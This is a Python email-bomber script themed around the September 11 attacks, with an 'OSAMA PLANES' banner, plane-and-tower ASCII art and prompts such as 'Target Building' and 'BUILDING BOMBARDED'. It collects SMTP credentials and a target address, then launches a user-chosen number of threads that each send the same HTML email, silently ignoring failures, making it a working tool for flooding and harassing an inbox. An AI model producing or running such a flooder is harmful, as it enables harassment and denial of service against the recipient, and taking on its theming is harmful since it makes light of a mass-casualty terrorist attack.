import ssl
import smtplib
from email.message import EmailMessage
import time
import threading
from colorama import Fore, Back, Style
import getpass
import tkinter as tk
import requests
from PIL import Image, ImageTk
from io import BytesIO
print(Back.BLACK+Fore.RED+"""

 ██████╗ ███████╗ █████╗ ███╗   ███╗ █████╗     ██████╗ ██╗      █████╗ ███╗   ██╗███████╗███████╗
██╔═══██╗██╔════╝██╔══██╗████╗ ████║██╔══██╗    ██╔══██╗██║     ██╔══██╗████╗  ██║██╔════╝██╔════╝
██║   ██║███████╗███████║██╔████╔██║███████║    ██████╔╝██║     ███████║██╔██╗ ██║█████╗  ███████╗
██║   ██║╚════██║██╔══██║██║╚██╔╝██║██╔══██║    ██╔═══╝ ██║     ██╔══██║██║╚██╗██║██╔══╝  ╚════██║
╚██████╔╝███████║██║  ██║██║ ╚═╝ ██║██║  ██║    ██║     ███████╗██║  ██║██║ ╚████║███████╗███████║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
   """)
print(Back.BLACK+ Fore.YELLOW+"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣤⣤⣤
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢰⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠐⢦⡄⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣤⠀⠀⠀⠀⠀⠀⠀⠂⠀⡀⠄⠀⠀⠀⠀⢸⣿⣿⣿⣿
⠀⠀⠱⡆⣀⣀⣀⣀⣰⣿⣷⣀⡀⠀⠀⠀⡄⠀⠀⢠⠃⠀⠀⠀⠀⢸⣿⣿⣿⣿
⠀⠀⢴⠋⠉⠉⠉⠉⣿⣿⠛⠈⠁⠈⠀⠀⠈⠂⠀⣴⡏⠀⠀⠀⠀⢸⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢸⣿⠘⠀⠀⠀⠀⠀⠀⣄⣠⢴⡹⡏⠀⠀⠀⠀⢸⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠏⠀⠀⠀⠀⠀⠀⢀⣿⣿⡤⢿⡗⠀⠀⠀⠀⢸⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⣤⡨⣡⣴⣿⣿⣷⣿⣏⢄⡐⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡨⢥⡖⠱⢈⡏⣙⡉⣁⠠⠀⠀⠿⠿⠿⠿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠒⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀            by: mr-k and prvvv""")



print(Style.RESET_ALL)

SMTP_SERVER = input(Fore.GREEN+"[+]Enter LaunchPad (Server) > ")

if SMTP_SERVER =="Afghanistan11":
    root = tk.Tk()
    root.title("Image Loader")
    url = """https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fmedia.pinatafarm.com%2Fprotected%2F65CA2375-85F2-4AA2-97D1-499E73E0306D%2F39b4f7f7-d71a-4c2b-bce5-dec7a8ebd31d-1670359239358-pfarm-with-png-watermarked.webp&f=1&nofb="""
    response = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
    image_data = response.content
    img = Image.open(BytesIO(image_data))
    tk_img = ImageTk.PhotoImage(img)
    label = tk.Label(root, image=tk_img)
    label.image = tk_img  
    label.pack()

    root.mainloop()

SMTP_PORT = int(input(Fore.GREEN+"[+] Enter Secret Tunnel (PORT No) >  "))  

USERNAME = input(Fore.GREEN+"[?]Enter the new OSAMA (Username/Email) > ")

PASSWORD = getpass.getpass(Fore.RED+  "[?]Enter the Launch Code (Password /Credz) > ")

to = input(Fore.GREEN+"[?]Enter Target Buliding > ")
how_many_T = input(Fore.GREEN+"[?]Enter the amount of PLATOONS (Thread) > ")
msg = EmailMessage()
msg["From"] = USERNAME
msg["To"] = to
msg["Subject"] = "GUESS WHO'S BACK"

# Plain-text fallback
msg.set_content("GUESS WHO's BACK")

# HTML body
msg.add_alternative("""
<center>
<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fyt3.ggpht.com%2Fa%2FAATXAJzBURDd59xHKO8rJExNpzKxdtfy8jOUX593Yg%3Ds900-c-k-c0xffffffff-no-rj-mo&f=1&nofb=1&ipt=b86691afa651770d210ae3f25657a31a7e418eabe6cdc18d11bdaa0a45dd065a">
</center>


""", subtype="html")

def  send_email():
        time.sleep(1)
        context = ssl.create_default_context()
        try:
            with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as smtp:
                smtp.login(USERNAME, PASSWORD)
                smtp.send_message(msg)
                print("[+]OSAMA HAS SUCCEEDED")
                print("[+]BUILDING BOMBARDED")
        except Exception as e:
            pass
for i in range(int(how_many_T)):
    r=threading.Thread(target=send_email)
    r.start()
    

